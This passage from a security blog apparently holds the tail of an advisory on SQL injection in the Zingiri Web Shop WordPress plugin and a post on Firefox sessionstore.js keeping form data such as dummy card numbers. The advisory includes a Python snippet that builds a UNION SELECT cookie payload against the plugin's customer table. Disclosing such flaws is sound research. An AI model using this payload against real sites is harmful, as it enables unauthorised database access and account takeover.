			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def ToHexString(input):
        hexString = "0x"
        for s in input:
                hexString += hex(ord(s))[2:]
        return hexString

cookie = "fws_cust=X#99999 UNION SELECT 1, 2, 3, 4, 5, 6, %s, 8, 9, 10, 11, 12, 13, %s, 15, 16, 17, 18, 19 FROM wp_zing_customer#eccbc87e4b5ce2fe28308fd9f2a7baf3" % (ToHexString(raw_input("Enter attacker IP:")), ToHexString("ADMIN"))</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa6576268587045-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6576268587045-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa6576268587045-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6576268587045-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa6576268587045-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6576268587045-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa6576268587045-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa6576268587045-1"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-k ">input</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6576268587045-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hexString</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"0x"</span></div><div class="crayon-line" id="crayon-53c98e7aa6576268587045-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-k ">input</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6576268587045-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">hexString</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">hex</span><span class="crayon-sy">(</span><span class="crayon-k ">ord</span><span class="crayon-sy">(</span><span class="crayon-i">s</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-53c98e7aa6576268587045-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">hexString</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6576268587045-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa6576268587045-7"><span class="crayon-k ">cookie</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fws_cust=X#99999 UNION SELECT 1, 2, 3, 4, 5, 6, %s, 8, 9, 10, 11, 12, 13, %s, 15, 16, 17, 18, 19 FROM wp_zing_customer#eccbc87e4b5ce2fe28308fd9f2a7baf3"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-k ">raw_input</span><span class="crayon-sy">(</span><span class="crayon-s">"Enter attacker IP:"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-s">"ADMIN"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0036 seconds] -->
<p>Numerous other vulnerabilities were fixed that used same attack vector, as a result of copy paste. These can be found by <a href="http://plugins.trac.wordpress.org/changeset?reponame=&amp;new=585862%40zingiri-web-shop&amp;old=538811%40zingiri-web-shop#file5">here</a> quite easily, and exploited the same way.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="https://charlieeriksen.github.io/tag/zingiri-web-shop/" rel="tag">Zingiri Web Shop</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/#respond" title="Comment on WordPress Zingiri Shop SQL injection vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-128 -->

				
					
<article id="post-72" class="post-72 post type-post status-publish format-standard hentry category-privacy tag-firefox tag-privacy">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/26/firefox-sessionstore-js-and-privacy/" title="8:30 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-26T20:30:11+00:00" pubdate>July 26, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/26/firefox-sessionstore-js-and-privacy/" title="Permalink to Firefox sessionstore.js and privacy" rel="bookmark">Firefox sessionstore.js and privacy</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Introduction</strong><br />
Firefox, much like other browsers, has been allowing you to restore browser &#8220;sessions&#8221;, which will restore the state of any page loaded, url, referrer, tab location, title, form data, the size of the rendering, font zooming, scrolling done on the page, closed tabs, and other fun things.</p>
<p>Personally, I find this to be an extremely neat feature. I use it on a regular basis, since I&#8217;ll often be trigger-happy on my close tab hotkeys. So it&#8217;s all nice and dandy, right? Well, the problem is that Firefox obviously can&#8217;t tell what data is sensitive and what isn&#8217;t. It will assume a form field marked as password type to be bad to include, but could there be other concerns? The answer is: Yes. And unless users are aware, this could be potentially bad. Here we&#8217;ll take a look at what is stored by the browser, and how we can observe this.</p>
<p><strong>Methodology</strong><br />
To test this, I had my VM with Procmon and a clean copy of the latest Firefox. Here are the steps taken to showcase this feature:</p>
<ul>
<li>Open procmon, filter by firefox.exe</li>
<li>Open firefox</li>
<li>Browse to http://www.stuffbysarah.net/ (This was *entirely* random, as it was the first page I found with a Paypal donate button)</li>
<li>Click on the &#8220;Donate&#8221; Paypal button</li>
<li>Fill out some random information in the Paypal form for making a transaction (Note that I had not previously logged into Paypal from this machine, thus getting a form to do the full transaction)</li>
<li>Open a new empty tab</li>
<li>Close the Paypal tab which contains the sensitive information, such as credit card number</li>
<li>Close Firefox</li>
<li>Search Procmon for sessionstore.js</li>
</ul>
<p>At this point we check out what is contained in the sessionstore.js file.</p>
<p><strong>Contents of sessionstore.js</strong><br />
The sessionstore.js is a simple JSON file, hence the .js extension (It contains no actual JavaScript code). It is a serialized state of the windows, closed windows, tabs, history, and closed tabs which is persisted on a regular basis. Here are the contents, having followed the above mentioned steps:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa6df8468221589" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{
  "windows": [
    {
      "tabs": [
        {
          "entries": [
            {
              "url": "about:newtab",
              "title": "New Tab",
              "ID": 4,
              "docshellID": 7,
              "owner_b64": "SmIS26zLEdO3ZQBgsLbOywAAAAAAAAAAwAAAAAAAAEY=",
              "docIdentifier": 4,
              "scroll": "0,0"
            }
          ],
          "index": 1,
          "hidden": false,
          "attributes": {

          }
        }
      ],
      "selected": 1,
      "_closedTabs": [
        {
          "state": {
            "entries": [
              {
                "url": "about:home",
                "title": "Mozilla Firefox Start Page",
                "ID": 0,
                "docshellID": 5,
                "owner_b64": "NhAra3tiRRqhyKDUVsktxQAAAAAAAAAAwAAAAAAAAEYAAQAAAAAAAS8nfAAOr03buTZBMmukiq45X+BFfRhK26P9r5jIoa8RAAAAAAVhYm91dAAAAARob21lAODaHXAvexHTjNAAYLD8FKM5X+BFfRhK26P9r5jIoa8RAAAAAA5tb3otc2FmZS1hYm91dAAAAARob21lAAAAAA==",
                "docIdentifier": 0
              },
              {
                "url": "http:\/\/www.stuffbysarah.net\/",
                "title": "Stuff by Sarah",
                "ID": 1,
                "docshellID": 5,
                "docIdentifier": 1
              },
                {
                "url": "https:\/\/www.paypal.com\/uk\/cgi-bin\/webscr?cmd=_flow&amp;amp;SESSION=bZOIeDb0Pkhss8uFCWB9TM0mnA1cCugBmxDUkBKIaGD_dWUEC49NT0MTATm&amp;amp;dispatch=5885d80a13c0db1f8e263663d3faee8d7283e7f0184a5674430f290db9e9c846",
                "title": "Billing Information - PayPal",
                "ID": 2,
                "docshellID": 5,
                "referrer": "http:\/\/www.stuffbysarah.net\/",
                "docIdentifier": 2,
                "children": [
                  {
                    "url": "about:blank",
                    "ID": 3,
                    "docshellID": 6,
                    "owner_b64": "NhAra3tiRRqhyKDUVsktxQAAAAAAAAAAwAAAAAAAAEYAAQAAAAAAAd6UctCANBHTk5kAEEug\/UA5X+BFfRhK26P9r5jIoa8RAAAAAv\/\/\/\/8AAAG7AQAAAMBodHRwczovL3d3dy5wYXlwYWwuY29tL3VrL2NnaS1iaW4vd2Vic2NyP2NtZD1fZmxvdyZTRVNTSU9OPWJaT0llRGIwUGtoc3M4dUZDV0I5VE0wbW5BMWNDdWdCbXhEVWtCS0lhR0RfZFdVRUM0OU5UME1UQVRtJmRpc3BhdGNoPTU4ODVkODBhMTNjMGRiMWY4ZTI2MzY2M2QzZmFlZThkNzI4M2U3ZjAxODRhNTY3NDQzMGYyOTBkYjllOWM4NDYAAAAAAAAABQAAAAgAAAAOAAAACP\/\/\/\/8AAAAI\/\/\/\/\/wAAAAgAAAAOAAAAFgAAAKoAAAAWAAAAEgAAABYAAAAMAAAAIgAAAAYAAAAi\/\/\/\/\/wAAAAD\/\/\/\/\/AAAAKQAAAJcAAAAW\/\/\/\/\/wEAAAAAAAAAAAABAAA=",
                    "docIdentifier": 3,
                    "scroll": "0,0"
                  }
                ],
                "formdata": {
                  "#amount": "9001",
                  "#country_code": 1,
                  "#first_name": "John",
                  "#last_name": "Doe",
                  "#credit_card_type": 2,
                  "#cc_number": "1111-2222-3333-4444-5555",
                  "#expdate_month": "01",
                  "#expdate_year": "12",
                  "#cvv2_number": "123",
                  "#address1": "Doestreet 1",
                  "#city": "Johntown",
                  "#state": 11,
                  "#zip": "9001",
                  "#H_PhoneNumber": "22523 30999",
                  "#email-address": "john.doe@doe.john"
                },
                "scroll": "0,428"
              }
            ],
            "index": 3,
            "hidden": false,
            "attributes": {
              "image": "https:\/\/www.paypalobjects.com\/en_US\/i\/icon\/pp_favicon_x.ico"
            }
          },
          "title": "Billing Information - PayPal",
          "image": "https:\/\/www.paypalobjects.com\/en_US\/i\/icon\/pp_favicon_x.ico",
          "pos": 0
        }
      ],
      "width": 938,
      "height": 882,
      "screenX": 517,
      "screenY": 0,
      "sizemode": "normal",
      "title": "New Tab",
      "_shouldRestore": true
    }
  ],
  "selectedWindow": 0,
  "_closedWindows": [

  ],
  "session": {
    "state": "stopped",
    "lastUpdate": 1343258515802,
    "startTime": 1343258444811,
    "recentCrashes": 0
  },
  "scratchpads": [

  ]
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-32">32</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-34">34</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-36">36</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-38">38</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-40">40</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-42">42</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-44">44</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-46">46</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-48">48</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-50">50</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-52">52</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-54">54</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-56">56</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-58">58</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-60">60</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-62">62</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-64">64</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-66">66</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-68">68</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-70">70</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-72">72</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-74">74</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-76">76</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-78">78</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-80">80</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-82">82</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-84">84</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-86">86</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-88">88</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-90">90</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-92">92</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-94">94</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-96">96</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-97">97</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-98">98</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-99">99</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-100">100</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-101">101</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-102">102</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-103">103</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-104">104</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-105">105</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-106">106</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-107">107</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-108">108</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-109">109</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-110">110</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-111">111</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-112">112</div><div class="crayon-num" data-line="crayon-53c98e7aa6df8468221589-113">113</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa6df8468221589-114">114</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-1"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"windows"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"tabs"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"entries"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"url"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"about:newtab"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"New Tab"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"ID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docshellID"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"owner_b64"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"SmIS26zLEdO3ZQBgsLbOywAAAAAAAAAAwAAAAAAAAEY="</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"docIdentifier"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"scroll"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"0,0"</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"index"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"hidden"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"attributes"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-20">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa6df8468221589-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa6df8468221589-22"><span 